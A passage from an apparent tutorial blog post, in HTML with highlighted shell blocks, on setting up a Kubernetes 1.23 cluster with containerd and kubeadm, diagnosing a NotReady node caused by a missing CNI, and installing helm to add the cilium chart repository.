<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cat</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">&#x3C;&#x3C;</span><span style="color: #ADBAC7">EOF</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> sudo tee /etc/containerd/config.toml</span></span>
<span data-line=""><span style="color: #96D0FF">version = 2</span></span>
<span data-line=""><span style="color: #96D0FF">[plugins]</span></span>
<span data-line=""><span style="color: #96D0FF">  [plugins."io.containerd.grpc.v1.cri"]</span></span>
<span data-line=""><span style="color: #96D0FF">   [plugins."io.containerd.grpc.v1.cri".containerd]</span></span>
<span data-line=""><span style="color: #96D0FF">      [plugins."io.containerd.grpc.v1.cri".containerd.runtimes]</span></span>
<span data-line=""><span style="color: #96D0FF">        [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]</span></span>
<span data-line=""><span style="color: #96D0FF">          runtime_type = "io.containerd.runc.v2"</span></span>
<span data-line=""><span style="color: #96D0FF">          [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]</span></span>
<span data-line=""><span style="color: #96D0FF">            SystemdCgroup = true</span></span>
<span data-line=""><span style="color: #ADBAC7">EOF</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">systemctl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">restart</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">containerd.service</span></span></code></pre></div>
<p>You can verify its running with ctr:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ctr</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--address</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/var/run/containerd/containerd.sock</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">containers</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span></span>
<span data-line=""><span style="color: #F69D50">CONTAINER</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">IMAGE</span><span style="color: #ADBAC7">    </span><span style="color: #96D0FF">RUNTIME</span></span></code></pre></div>
<p>Now that this is working we can move on to getting kubernetes installed!</p>
<h2>Using kubeadm!</h2>
<p>Now we need to get the kubernetes tools installed onto the system.  I’m going to be using 1.23
but to find the latest version you can run:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-cache</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">madison</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubeadm</span><span style="color: #F47067">|</span><span style="color: #F69D50">head</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-n2</span></span>
<span data-line=""><span style="color: #ADBAC7">   </span><span style="color: #F69D50">kubeadm</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7">  </span><span style="color: #F69D50">1.23.5-00</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">http://apt.kubernetes.io</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubernetes-xenial/main</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">amd64</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Packages</span></span>
<span data-line=""><span style="color: #ADBAC7">   </span><span style="color: #F69D50">kubeadm</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7">  </span><span style="color: #F69D50">1.23.4-00</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">http://apt.kubernetes.io</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubernetes-xenial/main</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">amd64</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Packages</span></span></code></pre></div>
<p>Then install the version you want, we install kubelet and kubeadm here to make
sure the versions align:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubeadm=</span><span style="color: #6CB6FF">1.23</span><span style="color: #96D0FF">.5-00</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubelet=</span><span style="color: #6CB6FF">1.23</span><span style="color: #96D0FF">.5-00</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl=</span><span style="color: #6CB6FF">1.23</span><span style="color: #96D0FF">.5-00</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-y</span></span></code></pre></div>
<p>This will pull in a few tools, including an alternative to <code>ctr</code> that we used earlier called
<code>crictl</code>.  You can check that it is available to you doing this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crictl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--runtime-endpoint=unix:///var/run/containerd/containerd.sock</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ps</span></span></code></pre></div>
<p>We can finally init our cluster:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubeadm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">init</span></span></code></pre></div>
<p>Once that finishes running it should give you some tips setup your configuration, it should look like this:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">mkdir</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-p</span><span style="color: #ADBAC7"> $HOME</span><span style="color: #96D0FF">/.kube</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cp</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-i</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/kubernetes/admin.conf</span><span style="color: #ADBAC7"> $HOME</span><span style="color: #96D0FF">/.kube/config</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">chown</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">$(</span><span style="color: #F69D50">id</span><span style="color: #96D0FF"> </span><span style="color: #6CB6FF">-u</span><span style="color: #96D0FF">):$(</span><span style="color: #F69D50">id</span><span style="color: #96D0FF"> </span><span style="color: #6CB6FF">-g</span><span style="color: #96D0FF">)</span><span style="color: #ADBAC7"> $HOME</span><span style="color: #96D0FF">/.kube/config</span></span></code></pre></div>
<p>You can run those on the master node for now, but later I'll show you how to move
the config to your host computer.</p>
<p>Now you should be able to check that your node is not ready yet:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">nodes</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">           </span><span style="color: #96D0FF">STATUS</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">ROLES</span><span style="color: #ADBAC7">                  </span><span style="color: #96D0FF">AGE</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">VERSION</span></span>
<span data-line=""><span style="color: #F69D50">controlplane</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">NotReady</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">control-plane,master</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">4</span><span style="color: #96D0FF">m16s</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">v1.23.5</span></span></code></pre></div>
<p><em>Note</em>: If you recieve "The connecto to the server was refused" error,
The cluster starting up and getting all the dependencies running could take
a bit of time.  So if you aren't able to communicate right away you can check
which pods are up and running with <code>crictl</code>.  You'll need <code>kube-apiserver</code> up
and running.  If it isn't you can check:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crictl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--runtime-endpoint=unix:///var/run/containerd/containerd.sock</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ps</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-a</span></span>
<span data-line=""><span style="color: #F69D50">CONTAINER</span><span style="color: #ADBAC7">           </span><span style="color: #96D0FF">IMAGE</span><span style="color: #ADBAC7">               </span><span style="color: #96D0FF">CREATED</span><span style="color: #ADBAC7">             </span><span style="color: #96D0FF">STATE</span><span style="color: #ADBAC7">               </span><span style="color: #96D0FF">NAME</span><span style="color: #ADBAC7">                      </span><span style="color: #96D0FF">ATTEMPT</span><span style="color: #ADBAC7">             </span><span style="color: #96D0FF">POD</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ID</span><span style="color: #ADBAC7">              </span><span style="color: #96D0FF">POD</span></span>
<span data-line=""><span style="color: #F69D50">8322192c4605c</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">bd8cc6d582470</span><span style="color: #ADBAC7">       </span><span style="color: #6CB6FF">36</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">seconds</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ago</span><span style="color: #ADBAC7">      </span><span style="color: #96D0FF">Running</span><span style="color: #ADBAC7">             </span><span style="color: #96D0FF">kube-proxy</span><span style="color: #ADBAC7">                </span><span style="color: #6CB6FF">4</span><span style="color: #ADBAC7">                   </span><span style="color: #6CB6FF">344</span><span style="color: #96D0FF">c4f7fffbe8</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">kube-proxy-drm46</span></span>
<span data-line=""><span style="color: #F69D50">30ce27c40adb2</span><span style="color: #ADBAC7">       </span><span style="color: #6CB6FF">81</span><span style="color: #96D0FF">a4a8a4ac639</span><span style="color: #ADBAC7">       </span><span style="color: #6CB6FF">2</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">minutes</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ago</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">Exited</span><span style="color: #ADBAC7">              </span><span style="color: #96D0FF">kube-controller-manager</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">4</span><span style="color: #ADBAC7">                   </span><span style="color: #6CB6FF">3</span><span style="color: #96D0FF">a819c3a864b2</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">kube-controller-manager-controlplane</span></span>
<span data-line=""><span style="color: #F69D50">7709fd5e92898</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">bd8cc6d582470</span><span style="color: #ADBAC7">       </span><span style="color: #6CB6FF">2</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">minutes</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ago</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">Exited</span><span style="color: #ADBAC7">              </span><span style="color: #96D0FF">kube-proxy</span><span style="color: #ADBAC7">                </span><span style="color: #6CB6FF">3</span><span style="color: #ADBAC7">                   </span><span style="color: #6CB6FF">7</span><span style="color: #96D0FF">cc6922c82015</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">kube-proxy-drm46</span></span>
<span data-line=""><span style="color: #F69D50">10432b81d7c61</span><span style="color: #ADBAC7">       </span><span style="color: #6CB6FF">3767741</span><span style="color: #96D0FF">e7fba7</span><span style="color: #ADBAC7">       </span><span style="color: #6CB6FF">2</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">minutes</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ago</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">Exited</span><span style="color: #ADBAC7">              </span><span style="color: #96D0FF">kube-apiserver</span><span style="color: #ADBAC7">            </span><span style="color: #6CB6FF">4</span><span style="color: #ADBAC7">                   </span><span style="color: #96D0FF">e64ddf3679d98</span><span style="color: #ADBAC7">       </span><span style="color: #96D0FF">kube-apiserver-controlplane</span></span></code></pre></div>
<p>which will show you pods that have exited. You can grab the container ID for
kube-apiserver and read its logs:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">crictl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--runtime-endpoint=unix:///var/run/containerd/containerd.sock</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">logs</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">10432</span><span style="color: #96D0FF">b81d7c61</span></span></code></pre></div>
<p>There are a few ways to figure out why the node isn’t ready yet.  Usually I would check the
<code>kubelet</code> logs first:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">journalctl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-flu</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubelet</span></span>
<span data-line=""><span style="color: #F69D50">--</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Logs</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">begin</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">at</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Sun</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">2022</span><span style="color: #96D0FF">-04-17</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">19</span><span style="color: #96D0FF">:22:19</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">AST.</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--</span></span>
<span data-line=""><span style="color: #F69D50">Apr</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">17</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">20</span><span style="color: #96D0FF">:53:15</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">controlplane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubelet[</span><span style="color: #6CB6FF">19727</span><span style="color: #96D0FF">]:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">E0417</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">20</span><span style="color: #96D0FF">:53:15.951350</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">19727</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubelet.go:2347]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Container runtime network not ready"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">networkReady="NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized"</span></span>
<span data-line=""><span style="color: #F69D50">Apr</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">17</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">20</span><span style="color: #96D0FF">:53:20</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">controlplane</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubelet[</span><span style="color: #6CB6FF">19727</span><span style="color: #96D0FF">]:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">E0417</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">20</span><span style="color: #96D0FF">:53:20.952148</span><span style="color: #ADBAC7">   </span><span style="color: #6CB6FF">19727</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubelet.go:2347]</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Container runtime network not ready"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">networkReady="NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized"</span></span></code></pre></div>
<p>It is clear the problem is that we are missing the CNI.  The other way you can find out what is
going on is describing the node:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">describe</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">node</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">controlplane</span></span></code></pre></div>
<p>This will have a lot of information but if you scroll through there looking at <code>Reason</code> you
might see something useful.  In this case under <code>Lease</code> you would see:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">describe</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">node</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">controlplane</span><span style="color: #F47067">|</span><span style="color: #F69D50">grep</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">NotReady</span></span>
<span data-line=""><span style="color: #F69D50">Ready</span><span style="color: #ADBAC7">            </span><span style="color: #96D0FF">False</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Sun,</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">17</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Apr</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">2022</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">20</span><span style="color: #96D0FF">:53:37</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-0400</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Sun,</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">17</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Apr</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">2022</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">20</span><span style="color: #96D0FF">:43:07</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-0400</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">KubeletNotReady</span><span style="color: #ADBAC7">              </span><span style="color: #96D0FF">container</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">runtime</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">network</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ready:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">NetworkReady=</span><span style="color: #6CB6FF">false</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">reason:NetworkPluginNotReady</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">message:Network</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">plugin</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">returns</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cni</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">plugin</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">initialize</span></span></code></pre></div>
<p>Lets get our CNI installed, we’ll be using cilium!</p>
<h2>Setting up your CNI!</h2>
<p>Cilium has great documentation over <a href="https://docs.cilium.io/en/v1.9/gettingstarted/k8s-install-kubeadm/">here</a>,
but I’ll walk you through it anyways.  I do recommend checking out their documentation so you
are familiar with it.   We will use <code>helm</code> to pull down the version of cilium we want:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">curl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-fsSL</span><span style="color: #ADBAC7">  </span><span style="color: #96D0FF">https://baltocdn.com/helm/signing.asc</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">gpg</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--dearmor</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/trusted.gpg.d/helm.gpg</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-transport-https</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--yes</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">echo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"deb https://baltocdn.com/helm/stable/debian/ all main"</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">tee</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">/etc/apt/sources.list.d/helm-stable-debian.list</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">update</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sudo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">apt-get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">install</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">helm</span></span></code></pre></div>
<p>Now we can install cilium!  It is <em>very</em> important that you pay attention to the
compatibility of cilium with the version of kubernetes you are intstalling. Check
the compatibility list <a href="https://docs.cilium.io/en/v1.12/concepts/kubernetes/compatibility/">here</a>.</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">helm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">repo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">add</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">cilium</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">https://helm.cilium.io/</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">helm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">repo</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">update</span></span></code></pre></div>
<p>Once the repo is added you can list the versions available:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">helm</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">search</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">repo</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-l</span><span style="color: #F47067">|</span><span style="color: #F69D50">head</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-n8</span></span>
<span data-line=""><span style="color: #F69D50">NAME</span><span style="color: #ADBAC7">           	</span><span style="color: #96D0FF">CHART</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">VERSION</span><span style="color: #ADBAC7">	</span><span style="color: #96D0FF">APP</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">VERSION</span><span style="color: #ADBAC7">	</span><span style="color: #96D0FF">DESCRIPTION</span></span>
<span data-line=""><span style="color: #F69D50">cilium/cilium</span><span style="color: #ADBAC7">  	</span><span style="color: #6CB6FF">1.12</span><span style="color: #96D0FF">.1</span><span style="color: #ADBAC7">       	</span><span style="color: #6CB6FF">1.12</span><span style="color: #96D0FF">.1</span><span style="color: #ADBAC7">     	</span><span style="color: #96D0FF">eBPF-based</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Networking,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Security,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">and</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Observability</span></span>
<span data-line=""><span style="color: #F69D50">cilium/cilium</span><span style="color: #ADBAC7">  	</span><span style="color: #6CB6FF">1.12</span><span style="color: #96D0FF">.0</span><span style="color: #ADBAC7">       	</span><span style="color: #6CB6FF">1.12</span><span style="color: #96D0FF">.0</span><span style="color: #ADBAC7">     	</span><span style="color: #96D0FF">eBPF-based</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Networking,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Security,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">and</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Observability</span></span>
<span data-line=""><span style="color: #F69D50">cilium/cilium</span><span style="color: #ADBAC7">  	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.8</span><span style="color: #ADBAC7">       	</span><span style="color: #6CB6FF">1.11</span><span style="color: #96D0FF">.8</span><span style="color: #ADBAC7">     	</span><span style="color: #96D0FF">eBPF-based</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Networking,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Security,</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">and</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Observability</span></span>
